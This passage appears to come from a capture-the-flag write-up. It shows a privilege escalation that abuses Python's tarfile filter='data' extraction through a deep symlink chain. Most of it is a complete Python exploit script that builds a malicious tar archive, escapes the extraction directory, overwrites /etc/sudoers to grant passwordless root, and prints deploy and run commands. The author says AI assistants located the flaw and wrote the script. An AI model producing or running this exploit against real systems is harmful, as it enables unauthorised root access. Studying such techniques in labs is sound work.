Using ChatGPT to analyze the script, I discover a vulnerability caused by filter="data". Specifically, when this filter is invoked by tar.extractall, it internally calls os.path.realpath, which is vulnerable to a Buffer Overflow. Searching online for this issue, I found a Google security advisory available here.

I therefore concluded that the privilege escalation vector was overwriting a sensitive file. In our case, to become root, we can rewrite /etc/sudoers to allow us to run sudo su with the credentials we already have. I then asked Claude to create the following script:

#!/usr/bin/env python3
"""
Tarfile symlink depth exploitation for path traversal bypass.

Creates deeply nested symlink chain to confuse filter="data" path resolution,
then escapes to overwrite /etc/sudoers for privilege escalation.

Technique: Abuse max path length and symlink resolution to bypass filter checks.
"""

import tarfile
import io
import os

# Configuration
OUTPUT_TAR = "/tmp/backup_9999.tar"
SUDOERS_PAYLOAD = b"wacky ALL=(ALL) NOPASSWD: ALL\n"

# Path construction constants
DIR_NAME = 'd' * 247          # Max component length (255 - margin)
SYMLINK_CHAIN = "abcdefghijklmnop" # 16 deep symlink chain
LINK_NAME = 'l' * 254          # Near-max filename length

def create_symlink_maze(tar, steps):
   """
   Build nested directory structure with symlinks at each level.
   Creates confusion chain: dir -> symlink -> dir -> symlink...
   """
   current_path = ""
   
   for step_char in steps:
      # Create directory
      dir_info = tarfile.TarInfo(os.path.join(current_path, DIR_NAME))
      dir_info.type = tarfile.DIRTYPE
      tar.addfile(dir_info)
      
      # Create symlink pointing to the directory
      sym_info = tarfile.TarInfo(os.path.join(current_path, step_char))
      sym_info.type = tarfile.SYMTYPE
      sym_info.linkname = DIR_NAME
      tar.addfile(sym_info)
      
      # Descend into the maze
      current_path = os.path.join(current_path, DIR_NAME)
   
   return current_path

def create_escape_chain(tar, steps):
   """
   Create final symlink that traverses back up using '../' chain
   to break out of staging directory.
   """
   # Build path through symlink chain: a/b/c/d/.../link
   link_path = os.path.join("/".join(steps), LINK_NAME)
   
   # Symlink points back up to root of staging
   escape_depth = len(steps)
   link_info = tarfile.TarInfo(link_path)
   link_info.type = tarfile.SYMTYPE
   link_info.linkname = "../" * escape_depth
   tar.addfile(link_info)
   
   return link_path

def exploit_to_etc(tar, escape_link):
   """
   Use the escape symlink to traverse to /etc and overwrite sudoers.
   """
   # Create symlink to /etc through the escape chain
   etc_link = tarfile.TarInfo("escape")
   etc_link.type = tarfile.SYMTYPE
   etc_link.linkname = f"{escape_link}/../../../../../../../etc"
   tar.addfile(etc_link)
   
   # Hardlink to sudoers file
   sudoers_hardlink = tarfile.TarInfo("sudoers_link")
   sudoers_hardlink.type = tarfile.LNKTYPE
   sudoers_hardlink.linkname = "escape/sudoers"
   tar.addfile(sudoers_hardlink)
   
   # Overwrite hardlink with malicious content
   sudoers_payload = tarfile.TarInfo("sudoers_link")
   sudoers_payload.type = tarfile.REGTYPE
   sudoers_payload.size = len(SUDOERS_PAYLOAD)
   tar.addfile(sudoers_payload, fileobj=io.BytesIO(SUDOERS_PAYLOAD))

def main():
   """
   Construct exploit tar with symlink maze leading to /etc/sudoers overwrite.
   """
   with tarfile.open(OUTPUT_TAR, mode="w") as tar:
      # Phase 1: Build confusing symlink depth maze
      create_symlink_maze(tar, SYMLINK_CHAIN)
      
      # Phase 2: Create escape hatch symlink
      escape_link = create_escape_chain(tar, SYMLINK_CHAIN)
      
      # Phase 3: Exploit escape to overwrite /etc/sudoers
      exploit_to_etc(tar, escape_link)
   
   print(f"[+] Exploit tar created: {OUTPUT_TAR}")
   print(f"[+] Target: /etc/sudoers")
   print(f"[+] Symlink depth: {len(SYMLINK_CHAIN)} levels")
   print(f"[+] Payload: {SUDOERS_PAYLOAD.decode().strip()}")
   print("\n[*] Deploy: cp /tmp/backup_9999.tar /opt/backup_clients/backups/")
   print("[*] Execute: sudo python3 /opt/backup_clients/restore_backup_clients.py -b backup_9999.tar -r restore_pwn")
   print("[*] Verify: sudo -l")

if __name__ == "__main__":
   main()
